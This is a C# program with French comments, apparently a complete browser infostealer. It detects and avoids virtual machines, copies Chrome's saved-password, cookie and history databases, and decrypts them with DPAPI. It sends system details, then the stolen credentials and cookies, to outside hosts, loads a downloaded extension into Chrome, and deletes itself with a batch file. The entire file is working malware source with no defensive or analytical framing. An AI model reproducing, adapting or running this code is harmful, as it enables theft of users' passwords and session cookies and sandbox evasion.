using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        // Vérifier si le programme s'exécute dans une VM
        if (IsRunningInVM())
        {
            Console.WriteLine("VM detected. Exiting...");
            return;
        }

        // Récupérer les informations système
        var systemInfo = GetSystemInfo();

        // Récupérer la configuration spécifique au système
        var config = await GetConfigFromServer(systemInfo);

        // Utiliser la configuration pour adapter le comportement du programme
        // Par exemple, vous pouvez ajuster les URLs ou les chemins en fonction de la configuration
        string chromeProfilePath = config.ChromeProfilePath ?? Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
        string loginDataPath = Path.Combine(chromeProfilePath, "Login Data");
        string cookiesDataPath = Path.Combine(chromeProfilePath, "Cookies");
        string historyDataPath = Path.Combine(chromeProfilePath, "History");

        // Copier les bases de données pour éviter les verrouillages
        string tempLoginDbPath = Path.Combine(Path.GetTempPath(), "Login Data.db");
        string tempCookiesDbPath = Path.Combine(Path.GetTempPath(), "Cookies.db");
        string tempHistoryDbPath = Path.Combine(Path.GetTempPath(), "History.db");
        File.Copy(loginDataPath, tempLoginDbPath, true);
        File.Copy(cookiesDataPath, tempCookiesDbPath, true);
        File.Copy(historyDataPath, tempHistoryDbPath, true);

        // Récupérer les mots de passe
        var credentials = GetCredentials(tempLoginDbPath);

        // Récupérer les cookies
        var cookies = GetCookies(tempCookiesDbPath);

        // Récupérer l'historique de navigation
        var history = GetHistory(tempHistoryDbPath);

        // Exfiltrer les données
        await ExfiltrateData(credentials, cookies, history);

        // Télécharger et installer l'extension personnalisée
        string extensionUrl = config.ExtensionUrl ?? "https://example.com/custom-extension.crx"; // URL de l'extension personnalisée
        string extensionPath = Path.Combine(Path.GetTempPath(), "custom-extension.crx");
        await DownloadExtension(extensionUrl, extensionPath);
        InstallExtension(extensionPath);

        // Supprimer les copies temporaires des bases de données
        File.Delete(tempLoginDbPath);
        File.Delete(tempCookiesDbPath);
        File.Delete(tempHistoryDbPath);

        // Supprimer le programme après l'exfiltration
        DeleteProgram();
    }

    static SystemInfo GetSystemInfo()
    {
        var systemInfo = new SystemInfo
        {
            ComputerName = Environment.MachineName,
            OSVersion = Environment.OSVersion.VersionString,
            UserName = Environment.UserName
        };

        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem"))
        {
            foreach (ManagementObject obj in searcher.Get())
            {
                systemInfo.OSArchitecture = obj["OSArchitecture"].ToString();
                systemInfo.TotalVisibleMemorySize = obj["TotalVisibleMemorySize"].ToString();
            }
        }

        return systemInfo;
    }

    static async Task<Config> GetConfigFromServer(SystemInfo systemInfo)
    {
        using (HttpClient client = new HttpClient())
        {
            string apiUrl = "https://happy.com/config";
            string jsonData = JsonSerializer.Serialize(systemInfo);
            StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            HttpResponseMessage response = await client.PostAsync(apiUrl, content);
            string responseString = await response.Content.ReadAsStringAsync();

            return JsonSerializer.Deserialize<Config>(responseString);
        }
    }

    static List<Credential> GetCredentials(string dbPath)
    {
        var credentials = new List<Credential>();
        string connectionString = $"Data Source={dbPath};Version=3;";
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
        {
            connection.Open();
            string query = "SELECT origin_url, username_value, password_value FROM logins";
            using (SQLiteCommand command = new SQLiteCommand(query, connection))
            using (SQLiteDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    string originUrl = reader.GetString(0);
                    string username = reader.GetString(1);
                    string encryptedPassword = reader.GetString(2);
                    string decryptedPassword = DecryptPassword(encryptedPassword);

                    credentials.Add(new Credential
                    {
                        Url = originUrl,
                        Username = username,
                        Password = decryptedPassword
                    });
                }
            }
        }
        return credentials;
    }

    static List<Cookie> GetCookies(string dbPath)
    {
        var cookies = new List<Cookie>();
        string connectionString = $"Data Source={dbPath};Version=3;";
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
        {
            connection.Open();
            string query = "SELECT host_key, name, value, encrypted_value FROM cookies";
            using (SQLiteCommand command = new SQLiteCommand(query, connection))
            using (SQLiteDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    string hostKey = reader.GetString(0);
                    string name = reader.GetString(1);
                    string value = reader.GetString(2);
                    string encryptedValue = reader.GetString(3);
                    string decryptedValue = DecryptPassword(encryptedValue);

                    cookies.Add(new Cookie
                    {
                        HostKey = hostKey,
                        Name = name,
                        Value = decryptedValue
                    });
                }
            }
        }
        return cookies;
    }

    static List<HistoryEntry> GetHistory(string dbPath)
    {
        var history = new List<HistoryEntry>();
        string connectionString = $"Data Source={dbPath};Version=3;";
        using (SQLiteConnection connection = new SQLiteConnection(connectionString))
        {
            connection.Open();
            string query = "SELECT url, title, last_visit_time FROM urls";
            using (SQLiteCommand command = new SQLiteCommand(query, connection))
            using (SQLiteDataReader reader = command.ExecuteReader())
            {
                while (reader.Read())
                {
                    string url = reader.GetString(0);
                    string title = reader.GetString(1);
                    long lastVisitTime = reader.GetInt64(2);

                    history.Add(new HistoryEntry
                    {
                        Url = url,
                        Title = title,
                        LastVisitTime = lastVisitTime
                    });
                }
            }
        }
        return history;
    }

    static string DecryptPassword(string encryptedPassword)
    {
        byte[] encryptedBytes = Convert.FromBase64String(encryptedPassword);
        byte[] decryptedBytes = ProtectedData.Unprotect(encryptedBytes, null, DataProtectionScope.CurrentUser);
        return Encoding.UTF8.GetString(decryptedBytes);
    }

    static async Task ExfiltrateData(List<Credential> credentials, List<Cookie> cookies, List<HistoryEntry> history)
    {
        using (HttpClient client = new HttpClient())
        {
            string apiUrl = "https://cgolf.com/api";
            var data = new
            {
                Credentials = credentials,
                Cookies = cookies,
                History = history
            };
            string jsonData = JsonSerializer.Serialize(data);
            StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            HttpResponseMessage response = await client.PostAsync(apiUrl, content);
            string responseString = await response.Content.ReadAsStringAsync();

            Console.WriteLine("Exfiltration Response: " + responseString);
        }
    }

    static async Task DownloadExtension(string url, string path)
    {
        using (HttpClient client = new HttpClient())
        {
            byte[] data = await client.GetByteArrayAsync(url);
            await File.WriteAllBytesAsync(path, data);
        }
    }

    static void InstallExtension(string path)
    {
        string chromePath = @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe";
        string arguments = $"--load-extension={path}";

        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = chromePath,
            Arguments = arguments,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process { StartInfo = startInfo })
        {
            process.Start();
            process.WaitForExit();
        }
    }

    static bool IsRunningInVM()
    {
        // Vérifier les indicateurs courants de VM
        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
        {
            foreach (ManagementObject obj in searcher.Get())
            {
                string manufacturer = obj["Manufacturer"].ToString().ToLower();
                if (manufacturer.Contains("microsoft corporation") && obj["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                {
                    return true;
                }
            }
        }

        using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
        {
            foreach (ManagementObject obj in searcher.Get())
            {
                if (obj["Model"].ToString().ToUpperInvariant().Contains("VBOX") ||
                    obj["Model"].ToString().ToUpperInvariant().Contains("VMWARE"))
                {
                    return true;
                }
            }
        }

        return false;
    }

    static void DeleteProgram()
    {
        string exePath = Process.GetCurrentProcess().MainModule.FileName;
        string batchPath = Path.Combine(Path.GetTempPath(), "delete.bat");

        using (StreamWriter writer = new StreamWriter(batchPath))
        {
            writer.WriteLine($"@echo off");
            writer.WriteLine($"ping 127.0.0.1 -n 5 > nul");
            writer.WriteLine($"del \"{exePath}\"");
            writer.WriteLine($"del \"{batchPath}\"");
        }

        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = batchPath,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = new Process { StartInfo = startInfo })
        {
            process.Start();
        }
    }
}

class Credential
{
    public string Url { get; set; }
    public string Username { get; set; }
    public string Password { get; set; }
}

class Cookie
{
    public string HostKey { get; set; }
    public string Name { get; set; }
    public string Value { get; set; }
}

class HistoryEntry
{
    public string Url { get; set; }
    public string Title { get; set; }
    public long LastVisitTime { get; set; }
}

class SystemInfo
{
    public string ComputerName { get; set; }
    public string OSVersion { get; set; }
    public string UserName { get; set; }
    public string OSArchitecture { get; set; }
    public string TotalVisibleMemorySize { get; set; }
}

class Config
{
    public string ChromeProfilePath { get; set; }
    public string ExtensionUrl { get; set; }
}
